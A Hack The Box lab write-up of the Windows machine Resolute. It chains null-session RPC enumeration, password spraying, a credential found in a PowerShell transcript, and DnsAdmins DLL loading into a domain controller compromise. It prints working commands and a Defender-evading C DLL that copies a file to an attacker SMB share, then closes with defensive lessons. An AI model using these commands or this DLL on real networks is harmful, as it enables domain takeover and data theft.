---
title: "HTB: Resolute · from anonymous RPC to Domain Admin via DnsAdmins"
date: 2026-09-10
draft: false
tags: ["hackthebox", "active-directory", "windows", "privilege-escalation", "dnsadmins"]
summary: "A retired medium Windows box that chains together the four most common ways real Active Directory environments leak: anonymous RPC enumeration, a password left in a user description, credential reuse, and a plaintext password in a PowerShell transcript, ending in a SYSTEM shell through the DnsAdmins group."
---

## Overview

Resolute is a retired medium-difficulty Windows machine from Hack The Box, worth writing up because every step maps directly to a misconfiguration you actually find in real AD environments, not a contrived CTF puzzle. The path is:

1. **Anonymous RPC enumeration** leaks the full user list and a password sitting in an account's description field.
2. **Password spraying** that credential across the domain lands a foothold on a different user (`melanie`).
3. A **plaintext credential in a PowerShell transcript** escalates laterally to `ryan`.
4. `ryan` is a member of **DnsAdmins**, which allows loading an arbitrary DLL into the DNS service, running as SYSTEM on the Domain Controller.

Target: `10.129.96.155`, a Windows Server 2016 Domain Controller for the domain `megabank.local`.

## Enumeration

Start with a full TCP port scan plus default scripts and version detection:

```bash
nmap -sC -sV -p- -oN nmap-resolute.txt 10.129.96.155
```

```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf       .NET Message Framing
...
```

The fingerprint is unambiguous: Kerberos (88), LDAP (389/3268), SMB (445), DNS (53) and WinRM (5985) all open. This is a **Domain Controller**. WinRM being open is worth noting early, if we ever get valid credentials for a user in the *Remote Management Users* group, we get an interactive shell.

### Why check anonymous access first

Before reaching for exploits or brute force, the first instinct on any AD target should be: *is there anonymous or null-session access?* It's one of the most common real-world misconfigurations, and it frequently leaks usernames, shares, and, as we'll see, passwords. `enum4linux-ng` bundles several SMB/RPC enumeration techniques into one run:

```bash
enum4linux-ng -A 10.129.96.155
```

Two things jump out. First, the RPC null session is allowed:

```
[+] Server allows authentication via username '' and password ''
```

Second, that null session is enough to dump all 27 domain users, and one of them has a password written in cleartext in its description field:

```
'1111':
  username: marko
  name: Marko Novak
  description: Account created. Password set to Welcome123!
```

This is a textbook finding. Someone in IT set a temporary onboarding password and left it in a place any unauthenticated user on the network can read.

The domain password policy is also worth noting:

```
Domain lockout information:
  Lockout threshold: None
```

No account lockout threshold means we can spray passwords across many accounts without any risk of locking anyone out. That makes the next step safe.

## Foothold

`Welcome123!` doesn't work for marko directly:

```bash
netexec smb 10.129.96.155 -u marko -p 'Welcome123!'
# STATUS_LOGON_FAILURE
```

That's expected, onboarding passwords like this are typically reused across *several* new accounts, not just one. So instead of trying one at a time, we test it against the entire user list. This is **password spraying**: one password, many users (the opposite of brute force), which is exactly why the missing lockout policy matters.

```bash
netexec smb 10.129.96.155 -u users.txt -p 'Welcome123!' --continue-on-success
```

```
SMB  10.129.96.155  445  RESOLUTE  [+] megabank.local\melanie:Welcome123!
```

One hit: **melanie**. She's in *Remote Management Users*, so WinRM is available:

```bash
netexec winrm 10.129.96.155 -u melanie -p 'Welcome123!'
# (Pwn3d!)

evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
```

```
*Evil-WinRM* PS C:\Users\melanie\Documents> type C:\Users\melanie\Desktop\user.txt
02cf8ae2************************ba
```

User flag captured.

## Lateral movement to ryan

`melanie` has nothing interesting privilege-wise (`whoami /all` shows only default groups), and her home directory has no PowerShell history. The `C:\Users` folder shows an `Administrator` and a `ryan` profile we can't read directly.

The break comes from listing the root of `C:\` with `-Force` to reveal hidden folders:

```powershell
dir C:\ -Force
```

```
d--h--  12/3/2019  6:32 AM   PSTranscripts
```

`PSTranscripts` is not a default Windows folder, it's hidden and was added manually. PowerShell transcription logs entire console sessions, including commands typed. Digging in (the subfolders are also hidden, so `-Recurse -Force`):

```powershell
dir C:\PSTranscripts -Recurse -Force
type "C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt"
```

Inside the transcript, `ryan` had run a `net use` command with his password on the command line, captured verbatim by the transcription:

```
CommandInvocation(Invoke-Expression): ...
value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123! ..."
```

Second textbook finding: **PowerShell transcription enabled without protecting the transcript directory**, exposing a plaintext credential to any user who can read the logs.

The credential is valid, and ryan is also in *Remote Management Users*:

```bash
netexec winrm 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
# (Pwn3d!)
```

## Privilege escalation · DnsAdmins to SYSTEM

Checking ryan's group membership reveals the key:

```powershell
whoami /groups
```

```
MEGABANK\DnsAdmins   Alias   ...   Local Group
```

`ryan` is a member of **DnsAdmins**. This is a well-known Active Directory design weakness (publicly documented since 2017): the Windows DNS service runs as **SYSTEM** on the Domain Controller, and members of DnsAdmins can configure it to load a custom "server-level plugin DLL" via the `serverlevelplugindll` setting, no local admin required. When the DNS service is restarted, it loads our DLL and runs its code as SYSTEM.

### Building a Defender-safe DLL

The obvious approach, `msfvenom -p windows/x64/exec ... -f dll`, produces a DLL whose shellcode is detected and silently blocked by the Windows Defender running on the box. The fix is to compile a plain C DLL ourselves; because it contains no recognizable shellcode, it sails past signature-based detection:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c copy C:\\Users\\Administrator\\Desktop\\root.txt \\\\10.10.14.55\\share\\pwned.txt", SW_HIDE);
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

A note on the payload choice: this box runs a cleanup task that periodically reverts changes (adding ryan to Domain Admins worked, but both the group membership and the registry value itself got reset within a couple of minutes). Rather than fight that race, the DLL simply exfiltrates the flag straight to an SMB share. Since the file lands on the attacker machine the instant the DLL executes, the box's cleanup is irrelevant.

### Serving the DLL

Host the DLL over SMB so the DC can pull it. **Important gotcha**: don't share your entire home directory. A `.gvfs` mount inside it breaks impacket's request handling and silently sabotages the DLL delivery. Use a clean folder with nothing but the DLL:

```bash
mkdir -p ~/smbshare && cp evil.dll ~/smbshare/
sudo impacket-smbserver share ~/smbshare -smb2support
```

### Triggering the load

From ryan's WinRM session, point the DNS service at the DLL and restart it:

```powershell
dnscmd.exe /config /serverlevelplugindll \\10.10.14.55\share\evil.dll
sc.exe stop dns
sc.exe start dns
```

One subtlety that cost me time: the DNS service only attempts to load the plugin when the registry value **changes**. If it's already set to the same path (or the cleanup task just wiped it), a plain restart won't re-trigger the load, so make sure the value actually changes before restarting.

The SMB server logs the DC connecting as `RESOLUTE$` (the machine account, i.e. SYSTEM) and pulling the DLL. Back on the attack box:

```bash
cat ~/smbshare/pwned.txt
581da83f************************03
```

Root flag captured. Full domain compromise.

## Lessons learned

Resolute is valuable precisely because none of its steps are exotic, they're the mistakes that show up in real assessments over and over:

- **Anonymous/null-session RPC** should be disabled on domain controllers; it hands an attacker your entire user list for free.
- **Never store passwords in AD attributes** like the description field, they're readable by any authenticated (here, even unauthenticated) user.
- **Onboarding password reuse** turns one leaked credential into a foothold; temporary passwords should be unique and force-changed at first logon.
- **PowerShell transcription is a great defensive control**, but the transcript directory must be locked down, or it becomes a credential store for attackers.
- **DnsAdmins is effectively Domain Admin** on a DC. Treat membership as tier-0 and audit it.

*Flags are partially redacted, per convention.*

---

I also wrote this engagement up as a formal penetration test report, the same format I would deliver to a client, with an executive summary, CVSS-scored findings, and remediation guidance.

📄 [**Download the full pentest report (PDF)**](/reports/Resolute_Pentest_Report/Resolute_Pentest_Report_EN.pdf)
